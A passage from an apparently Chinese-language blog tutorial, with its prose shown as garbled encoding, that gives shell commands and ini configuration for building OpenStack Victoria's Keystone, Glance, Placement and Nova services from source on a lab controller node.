/etc/hosts</span><br><span class="line"></span><br><span class="line"><span class="comment"># 10.0.2.28 controller</span></span><br><span class="line"><span class="comment"># 10.0.2.29 compute</span></span><br></pre></td></tr></table></figure><p>æ¯ä¸ªä¸»æœºçš„ç”¨æˆ·éƒ½æ˜¯ jck ï¼Œæœ€åçš„ç½‘ç»œé…ç½®å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ§åˆ¶èŠ‚ç‚¹</span></span><br><span class="line">10.0.2.28</span><br><span class="line">192.168.56.115</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡ç®—èŠ‚ç‚¹</span></span><br><span class="line">10.0.2.29</span><br><span class="line">192.168.56.116</span><br></pre></td></tr></table></figure><h1 id="æ§åˆ¶èŠ‚ç‚¹"><a href="#æ§åˆ¶èŠ‚ç‚¹" class="headerlink" title="æ§åˆ¶èŠ‚ç‚¹"></a>æ§åˆ¶èŠ‚ç‚¹</h1><h2 id="Keystone"><a href="#Keystone" class="headerlink" title="Keystone"></a>Keystone</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä¸‹è½½æºç </span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/keystone.git -b stable/victoria --single-branch</span><br><span class="line"><span class="built_in">cd</span> keystone</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£…ä¾èµ–</span></span><br><span class="line">pip install bindep</span><br><span class="line">sudo apt install $(bindep -b) -y</span><br><span class="line">pip install -r requirements.txt</span><br><span class="line">pip install -r test-requirements.txt</span><br><span class="line"><span class="comment">#pip install -e .</span></span><br><span class="line">pip install tox</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”Ÿæˆé…ç½®æ–‡ä»¶</span></span><br><span class="line">git init</span><br><span class="line">tox -e genconfig</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ•°æ®åº“ï¼Œå¯†ç è®¾ç½®ä¸º mysql_db</span></span><br><span class="line">sudo mysql_secure_installation</span><br><span class="line">sudo mysql -u root -p</span><br><span class="line"><span class="comment">#CREATE DATABASE keystone;</span></span><br><span class="line"><span class="comment">#GRANT ALL PRIVILEGES ON keystone.* TO &#x27;keystone&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;KEYSTONE_DBPASS&#x27;;</span></span><br><span class="line"><span class="comment">#GRANT ALL PRIVILEGES ON keystone.* TO &#x27;keystone&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;KEYSTONE_DBPASS&#x27;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># é…ç½®æ–‡ä»¶</span></span><br><span class="line">sudo mkdir /etc/keystone</span><br><span class="line">sudo cp etc/keystone.conf.sample /etc/keystone/keystone.conf</span><br><span class="line">sudo vim /etc/keystone/keystone.conf</span><br><span class="line"><span class="comment">#[database]</span></span><br><span class="line"><span class="comment">#connection = mysql+pymysql://keystone:KEYSTONE_DBPASS@controller/keystone</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£…</span></span><br><span class="line">sudo python setup.py install</span><br><span class="line">keystone-manage db_sync</span><br><span class="line"><span class="comment">#.tox/genconfig/bin/pip3 install opentracing</span></span><br><span class="line"><span class="comment">#.tox/genconfig/bin/keystone-manage db_sync</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»¤ç‰Œ</span></span><br><span class="line">sudo mkdir -p /etc/keystone/fernet-keys</span><br><span class="line"><span class="comment"># sudo rm -rf /etc/keystone/fernet-keys/</span></span><br><span class="line">sudo keystone-manage fernet_setup --keystone-user jck --keystone-group jck</span><br><span class="line">sudo keystone-manage credential_setup --keystone-user jck --keystone-group jck</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆå§‹åŒ–</span></span><br><span class="line">keystone-manage bootstrap --bootstrap-password ADMIN_PASS \</span><br><span class="line">  --bootstrap-admin-url http://controller:5000/v3/ \</span><br><span class="line">  --bootstrap-internal-url http://controller:5000/v3/ \</span><br><span class="line">  --bootstrap-public-url http://controller:5000/v3/ \</span><br><span class="line">  --bootstrap-region-id RegionOne</span><br><span class="line">  </span><br><span class="line"><span class="comment"># apache</span></span><br><span class="line">sudo apt install apache2 libapache2-mod-wsgi-py3 -y</span><br><span class="line">sudo cp httpd/wsgi-keystone.conf /etc/apache2/conf-available/wsgi-keystone.conf</span><br><span class="line">sudo vim /etc/apache2/conf-available/wsgi-keystone.conf</span><br><span class="line"><span class="comment"># ä¿®æ”¹ user å’Œ group ä¸º jck</span></span><br><span class="line">sudo ln -s /etc/apache2/conf-available/wsgi-keystone.conf /etc/apache2/conf-enabled/wsgi-keystone.conf</span><br><span class="line">sudo service apache2 restart</span><br></pre></td></tr></table></figure><p>éªŒè¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å®‰è£…å®¢æˆ·ç«¯</span></span><br><span class="line">pip install python-openstackclient</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºè„šæœ¬</span></span><br><span class="line">cat &lt;&lt;<span class="string">EOF&gt;&gt; admin-openrc</span></span><br><span class="line"><span class="string">export OS_USERNAME=admin</span></span><br><span class="line"><span class="string">export OS_PASSWORD=ADMIN_PASS</span></span><br><span class="line"><span class="string">export OS_PROJECT_NAME=admin</span></span><br><span class="line"><span class="string">export OS_USER_DOMAIN_NAME=Default</span></span><br><span class="line"><span class="string">export OS_PROJECT_DOMAIN_NAME=Default</span></span><br><span class="line"><span class="string">export OS_AUTH_URL=http://controller:5000/v3</span></span><br><span class="line"><span class="string">export OS_IDENTITY_API_VERSION=3</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åŠ è½½ç¯å¢ƒå˜é‡</span></span><br><span class="line">. admin-openrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># æµ‹è¯•</span></span><br><span class="line">openstack user list</span><br></pre></td></tr></table></figure><h2 id="Glance"><a href="#Glance" class="headerlink" title="Glance"></a>Glance</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¯†ç  mysql_db</span></span><br><span class="line">sudo mysql -u root -p</span><br><span class="line"><span class="comment">#CREATE DATABASE glance;</span></span><br><span class="line"><span class="comment">#GRANT ALL PRIVILEGES ON glance.* TO &#x27;glance&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;GLANCE_DBPASS&#x27;;</span></span><br><span class="line"><span class="comment">#GRANT ALL PRIVILEGES ON glance.* TO &#x27;glance&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;GLANCE_DBPASS&#x27;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åŠ è½½ç¯å¢ƒå˜é‡</span></span><br><span class="line">. admin-openrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºé¡¹ç›®</span></span><br><span class="line">openstack project create --domain default --description <span class="string">&quot;Service Project&quot;</span> service</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºç”¨æˆ·ï¼Œè®¾ç½®å¯†ç ä¸º glance</span></span><br><span class="line">openstack user create --domain default --password-prompt glance</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†ç”¨æˆ·æ·»åŠ åˆ° admin è§’è‰²</span></span><br><span class="line">openstack role add --project service --user glance admin</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºæœåŠ¡å®ä½“</span></span><br><span class="line">openstack service create --name glance --description <span class="string">&quot;OpenStack Image&quot;</span> image</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºæœåŠ¡ API ç«¯ç‚¹ï¼ˆendpointï¼‰</span></span><br><span class="line">openstack endpoint create --region RegionOne image public http://controller:9292</span><br><span class="line">openstack endpoint create --region RegionOne image internal http://controller:9292</span><br><span class="line">openstack endpoint create --region RegionOne image admin http://controller:9292</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸‹è½½æºç </span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/glance.git --branch stable/victoria --single-branch</span><br><span class="line"><span class="built_in">cd</span> glance</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£…ä¾èµ–</span></span><br><span class="line">sudo apt install $(bindep -b) -y</span><br><span class="line">pip install -r requirements.txt</span><br><span class="line">pip install -r test-requirements.txt</span><br><span class="line"><span class="comment"># git init</span></span><br><span class="line">.tox/genconfig/bin/pip3 install opentracing</span><br><span class="line">tox -e genconfig</span><br><span class="line"></span><br><span class="line">sudo python setup.py install</span><br><span class="line"></span><br><span class="line"><span class="comment"># é…ç½®æ–‡ä»¶</span></span><br><span class="line">sudo mkdir /etc/glance</span><br><span class="line">sudo cp etc/glance-api.conf /etc/glance/glance-api.conf</span><br><span class="line">sudo cp etc/glance-api-paste.ini /etc/glance/glance-api-paste.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¼–è¾‘é…ç½®æ–‡ä»¶</span></span><br><span class="line">sudo vim /etc/glance/glance-api.conf</span><br></pre></td></tr></table></figure><p>é…ç½®å¦‚ä¸‹ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[database]</span></span><br><span class="line"><span class="attr">connection</span> = mysql+pymysql://glance:GLANCE_DBPASS@controller/glance</span><br><span class="line"></span><br><span class="line"><span class="section">[keystone_authtoken]</span></span><br><span class="line"><span class="attr">www_authenticate_uri</span>  = http://controller:<span class="number">5000</span>/v3</span><br><span class="line"><span class="attr">auth_url</span> = http://controller:<span class="number">5000</span>/v3</span><br><span class="line"><span class="attr">auth_type</span> = password</span><br><span class="line"><span class="attr">project_domain_name</span> = Default</span><br><span class="line"><span class="attr">user_domain_name</span> = Default</span><br><span class="line"><span class="attr">project_name</span> = service</span><br><span class="line"><span class="attr">username</span> = glance</span><br><span class="line"><span class="attr">password</span> = glance</span><br><span class="line"><span class="comment">#memcached_servers = controller:11211</span></span><br><span class="line"></span><br><span class="line"><span class="section">[paste_deploy]</span></span><br><span class="line"><span class="attr">flavor</span> = keystone</span><br><span class="line"></span><br><span class="line"><span class="section">[glance_store]</span></span><br><span class="line"><span class="attr">stores</span> = file,http</span><br><span class="line"><span class="attr">default_store</span> = file</span><br><span class="line"><span class="attr">filesystem_store_datadir</span> = /var/lib/glance/images/</span><br></pre></td></tr></table></figure><p>å¯ç”¨æœåŠ¡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¡«å……æ•°æ®åº“</span></span><br><span class="line">.tox/genconfig/bin/glance-manage db_sync</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯ç”¨æœåŠ¡ï¼ˆåå°ï¼‰</span></span><br><span class="line">sudo glance-api --config-file=/etc/glance/glance-api.conf --config-file=/etc/glance/glance-api-paste.ini --debug</span><br></pre></td></tr></table></figure><p>æµ‹è¯•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä¸‹è½½æºé•œåƒ</span></span><br><span class="line">wget http://download.cirros-cloud.net/0.4.0/cirros-0.4.0-x86_64-disk.img</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸Šä¼ é•œåƒåˆ°é•œåƒæœåŠ¡ï¼Œå…¬å¼€å¯è§ï¼ˆæ‰€æœ‰é¡¹ç›®éƒ½å¯ä»¥è®¿é—®ï¼‰</span></span><br><span class="line">openstack image create <span class="string">&quot;cirros&quot;</span> \</span><br><span class="line">  --file cirros-0.4.0-x86_64-disk.img \</span><br><span class="line">  --disk-format qcow2 --container-format bare \</span><br><span class="line">  --public</span><br><span class="line">  </span><br><span class="line"><span class="comment"># åˆ—å‡ºé•œåƒ</span></span><br><span class="line">openstack image list</span><br></pre></td></tr></table></figure><h2 id="Placement"><a href="#Placement" class="headerlink" title="Placement"></a>Placement</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¯†ç  mysql_db</span></span><br><span class="line">sudo mysql -u root -p</span><br><span class="line"><span class="comment">#CREATE DATABASE placement;</span></span><br><span class="line"><span class="comment">#GRANT ALL PRIVILEGES ON placement.* TO &#x27;placement&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;PLACEMENT_DBPASS&#x27;;</span></span><br><span class="line"><span class="comment">#GRANT ALL PRIVILEGES ON placement.* TO &#x27;placement&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;PLACEMENT_DBPASS&#x27;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åŠ è½½ç¯å¢ƒå˜é‡</span></span><br><span class="line">. admin-openrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºç”¨æˆ·ï¼Œè®¾ç½®å¯†ç ä¸º placement</span></span><br><span class="line">openstack user create --domain default --password-prompt placement</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†ç”¨æˆ·æ·»åŠ åˆ° admin è§’è‰²</span></span><br><span class="line">openstack role add --project service --user placement admin</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºæœåŠ¡å®ä½“</span></span><br><span class="line">openstack service create --name placement --description <span class="string">&quot;Placement API&quot;</span> placement</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºæœåŠ¡ API ç«¯ç‚¹ï¼ˆendpointï¼‰</span></span><br><span class="line">openstack endpoint create --region RegionOne placement public http://controller:8778</span><br><span class="line">openstack endpoint create --region RegionOne placement internal http://controller:8778</span><br><span class="line">openstack endpoint create --region RegionOne placement admin http://controller:8778</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸‹è½½æºç </span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/placement.git --branch stable/victoria --single-branch</span><br><span class="line"><span class="built_in">cd</span> placement</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£…ä¾èµ–</span></span><br><span class="line">sudo apt install $(bindep -b) -y</span><br><span class="line">pip install -r requirements.txt</span><br><span class="line">pip install -r test-requirements.txt</span><br><span class="line"><span class="comment"># git init</span></span><br><span class="line"><span class="comment"># .tox/shared/bin/pip3 install -r requirements.txt</span></span><br><span class="line">tox -e genconfig</span><br><span class="line"></span><br><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure><p>é…ç½®æ–‡ä»¶ /etc/placement/placement.conf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»ºæ–‡ä»¶å¤¹</span></span><br><span class="line">sudo mkdir /etc/placement</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‹·è´é…ç½®æ–‡ä»¶</span></span><br><span class="line">sudo cp etc/placement/placement.conf.sample /etc/placement/placement.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ”¹</span></span><br><span class="line">sudo vim /etc/placement/placement.conf</span><br></pre></td></tr></table></figure><p>é…ç½®å¦‚ä¸‹ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[placement_database]</span></span><br><span class="line"><span class="attr">connection</span> = mysql+pymysql://placement:PLACEMENT_DBPASS@controller/placement</span><br><span class="line"></span><br><span class="line"><span class="section">[api]</span></span><br><span class="line"><span class="attr">auth_strategy</span> = keystone</span><br><span class="line"></span><br><span class="line"><span class="section">[keystone_authtoken]</span></span><br><span class="line"><span class="attr">auth_url</span> = http://controller:<span class="number">5000</span>/v3</span><br><span class="line"><span class="attr">auth_type</span> = password</span><br><span class="line"><span class="attr">project_domain_name</span> = Default</span><br><span class="line"><span class="attr">user_domain_name</span> = Default</span><br><span class="line"><span class="attr">project_name</span> = service</span><br><span class="line"><span class="attr">username</span> = placement</span><br><span class="line"><span class="attr">password</span> = placement</span><br><span class="line"><span class="comment">#memcached_servers = 127.0.0.1:11211</span></span><br></pre></td></tr></table></figure><p>å¯ç”¨æœåŠ¡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¡«å……æ•°æ®åº“</span></span><br><span class="line">.tox/shared/bin/placement-manage db sync</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯ç”¨æœåŠ¡</span></span><br><span class="line">sudo service apache2 restart</span><br><span class="line">sudo placement-api --port 8778</span><br></pre></td></tr></table></figure><p>éªŒè¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">. admin-openrc</span><br><span class="line">placement-status upgrade check</span><br></pre></td></tr></table></figure><h2 id="Nova"><a href="#Nova" class="headerlink" title="Nova"></a>Nova</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å®‰è£… RabbitMQ</span></span><br><span class="line">sudo apt install rabbitmq-server -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ·»åŠ  openstack ç”¨æˆ·</span></span><br><span class="line">sudo rabbitmqctl add_user openstack RABBIT_PASS</span><br><span class="line"></span><br><span class="line"><span class="comment"># æƒé™è®¾ç½®</span></span><br><span class="line">sudo rabbitmqctl set_permissions openstack <span class="string">&quot;.*&quot;</span> <span class="string">&quot;.*&quot;</span> <span class="string">&quot;.*&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ•°æ®åº“é…ç½®ï¼Œå¯†ç  mysql_db</span></span><br><span class="line">sudo mysql -u root -p</span><br><span class="line"><span class="comment">#CREATE DATABASE nova_api;</span></span><br><span class="line"><span class="comment">#CREATE DATABASE nova;</span></span><br><span class="line"><span class="comment">#CREATE DATABASE nova_cell0;</span></span><br><span class="line"><span class="comment">#GRANT ALL PRIVILEGES ON nova_api.* TO &#x27;nova&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;NOVA_DBPASS&#x27;;</span></span><br><span class="line"><span class="comment">#GRANT ALL PRIVILEGES ON nova_api.* TO &#x27;nova&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;NOVA_DBPASS&#x27;;</span></span><br><span class="line"><span class="comment">#GRANT ALL PRIVILEGES ON nova.* TO &#x27;nova&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;NOVA_DBPASS&#x27;;</span></span><br><span class="line"><span class="comment">#GRANT ALL PRIVILEGES ON nova.* TO &#x27;nova&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;NOVA_DBPASS&#x27;;</span></span><br><span class="line"><span class="comment">#GRANT ALL PRIVILEGES ON nova_cell0.* TO &#x27;nova&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;NOVA_DBPASS&#x27;;</span></span><br><span class="line"><span class="comment">#GRANT ALL PRIVILEGES ON nova_cell0.* TO &#x27;nova&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;NOVA_DBPASS&#x27;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åŠ è½½ç¯å¢ƒå˜é‡</span></span><br><span class="line">. admin-openrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºç”¨æˆ·ï¼Œè®¾ç½®å¯†ç ä¸º nova</span></span><br><span class="line">openstack user create --domain default --password-prompt nova</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†ç”¨æˆ·æ·»åŠ åˆ° admin è§’è‰²</span></span><br><span class="line">openstack role add --project service --user nova admin</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºæœåŠ¡å®ä½“</span></span><br><span class="line">openstack service create --name nova --description <span class="string">&quot;OpenStack Compute&quot;</span> compute</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºæœåŠ¡ API ç«¯ç‚¹ï¼ˆendpointï¼‰</span></span><br><span class="line">openstack endpoint create --region RegionOne compute public http://controller:8774/v2.1</span><br><span class="line">openstack endpoint create --region RegionOne compute internal http://controller:8774/v2.1</span><br><span class="line">openstack endpoint create --region RegionOne compute admin http://controller:8774/v2.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸‹è½½æºç </span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/nova.git --branch stable/victoria --single-branch</span><br><span class="line"><span class="built_in">cd</span> nova</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£…ä¾èµ–</span></span><br><span class="line">sudo apt install $(bindep -b) -y</span><br><span class="line">pip install -r requirements.txt</span><br><span class="line">pip install -r test-requirements.txt</span><br><span class="line"><span class="comment"># git init</span></span><br><span class="line">tox -e genconfig</span><br><span class="line"></span><br><span class="line">sudo python setup.py install</span><br><span class="line"></span><br><span class="line"><span class="comment"># é…ç½®æ–‡ä»¶</span></span><br><span class="line">sudo mkdir /etc/nova</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‹·è´é…ç½®æ–‡ä»¶</span></span><br><span class="line">sudo cp etc/nova/nova.conf.sample /etc/nova/nova.conf</span><br><span class="line">sudo cp etc/nova/api-paste.ini /etc/nova/api-paste.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ”¹</span></span><br><span class="line">sudo vim /etc/nova/nova.conf</span><br></pre></td></tr></table></figure><p>é…ç½®å¦‚ä¸‹ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[api_database]</span></span><br><span class="line"><span class="attr">connection</span> = mysql+pymysql://nova:NOVA_DBPASS@controller/nova_api</span><br><span class="line"></span><br><span class="line"><span class="section">[database]</span></span><br><span class="line"><span class="attr">connection</span> = mysql+pymysql://nova:NOVA_DBPASS@controller/nova</span><br><span class="line"></span><br><span class="line"><span class="section">[DEFAULT]</span></span><br><span class="line"><span class="attr">transport_url</span> = rabbit://openstack:RABBIT_PASS@controller:<span class="number">5672</span>/</span><br><span class="line"><span class="attr">my_ip</span> = <span class="number">10.0</span>.<span class="number">2.28</span></span><br><span class="line"></span><br><span class="line"><span class="section">[api]</span></span><br><span class="line"><span class="attr">auth_strategy</span> = keystone</span><br><span class="line"></span><br><span class="line"><span class="section">[keystone_authtoken]</span></span><br><span class="line"><span class="attr">www_authenticate_uri</span> = http://controller:<span class="number">5000</span>/</span><br><span class="line"><span class="attr">auth_url</span> = http://controller:<span 